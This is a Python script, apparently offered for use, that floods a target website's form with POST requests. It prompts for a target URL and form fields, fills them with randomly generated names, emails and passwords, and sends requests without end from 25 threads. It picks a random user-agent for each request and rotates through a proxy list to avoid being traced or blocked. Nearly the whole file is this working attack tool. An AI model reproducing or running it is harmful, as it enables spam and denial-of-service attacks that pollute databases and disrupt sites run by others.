import threading
import requests
import random
import string
import time
import names
import subprocess

from random_username.generate import generate_username
from fake_useragent import UserAgent

def name_gen():#Generates a random name for the email
    name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
    first_name = names.get_first_name()
    last_name = names.get_last_name()
    if name_system == "FullName":#JohnDoe
        return first_name + last_name
    elif name_system == "FullFirstFirstInitial":#JohnD
        return first_name + last_name[0]
    return first_name[0] + last_name#JDoe

def generate_random_username():
    return generate_username()[0]#Gets a list with one username(adjectivNounNumber) the [0] converts it to a string.

def generate_random_username():
    return generate_username()[0]#Gets a list with one username(adjectivNounNumber) the [0] converts it to a string.

def generate_random_email():
    name = name_gen()
    NumberOrNo=random.choice(["Number", "No"])
    domain = random.choice(["@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com"])#Popular email providers
    if NumberOrNo == "Number":
        return name + str(random.randint(1, 100)) + domain
    else:
        return name + domain

def generate_random_password():
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))

def send_posts(url, args, proxies):
    while True:
        data = {key: (value() if callable(value) else value) for key, value in args.items()}
        ua = UserAgent()
        user_agent = ua.random
        headers = {'User-Agent': user_agent}
        if proxies == []:
            response = requests.post(url, data=data, headers=headers,)
        else:
            proxy = random.choice(proxies)
            proxy = {"http": proxy, "https": proxy}
            response = requests.post(url, data=data, headers=headers, proxies=proxy)
        print(f"Parameters: {args}, Status Code: {response.status_code}, headers: {user_agent}")

def main():
    url = input("Enter the URL of the target you want to flood: ")
    args = {}
    while True:
        name = input("Enter the name of a parameter, if you're done press enter: ")
        if name == "":
            break
        value = input("Enter the value of the field, u = username, e = email, p = password, everything else is static: ")
        if value == "u":
            args[name] = generate_random_username
        elif value == "p":
            args[name] = generate_random_password
        elif value == "e":
            args[name] = generate_random_email
        else:
            args[name] = value
    try:
        with open("proxies.txt", "r") as f:
            proxies = [l.strip() for l in f if l.strip()]
    except:
        proxies = []
    if len(proxies) == 1:
        print("Successfully loaded 1 proxy")
    else:
        print(f"Successfully loaded {len(proxies)} proxies")
    print(f"Url: {url}")
    print(f"Parameters: {args}")
    print("Starting...")
    time.sleep(3)
    threads = [threading.Thread(target=send_posts, args=(url, args, proxies,), daemon=True) for _ in range(25)]

    for t in threads:
        t.start()

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()